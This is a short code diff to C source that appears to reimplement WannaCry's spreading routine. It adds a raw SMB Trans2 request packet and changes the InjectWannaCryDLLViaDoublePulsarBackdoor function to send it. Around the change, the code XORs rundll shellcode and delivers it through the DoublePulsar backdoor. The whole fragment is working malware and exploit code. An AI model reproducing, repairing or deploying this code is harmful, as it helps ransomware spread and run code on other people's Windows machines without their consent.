@@ -40,6 +40,13 @@ unsigned char trans2_session_setup[] =
 "\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
 "\x00\x00"
 
+unsigned char wannacry_Trans2_Request[] =
+"\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0"
+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe"
+"\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00"
+"\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01"
+"\x00\x0e\x00\x0d\x10\x00";
+
 unsigned int LE2INT(unsigned char *data)
 {
             unsigned int b;
@@ -260,7 +267,7 @@ int InjectWannaCryDLLViaDoublePulsarBackdoor(SOCKET s, int architectureType, int
 	}
 	memcpy(hMem, rundll_shellcode, shellcode_payload_size);
 	xor_payload(xkey, hMem, total_size);
-	memcpy(send_buffer, wannacry_trans2_exec_packet, 70);
+	memcpy(send_buffer, wannacry_Trans2_Request, 70);
 	
 	v9 = total_size / 4096;
 	v10 = total_size % 4096;
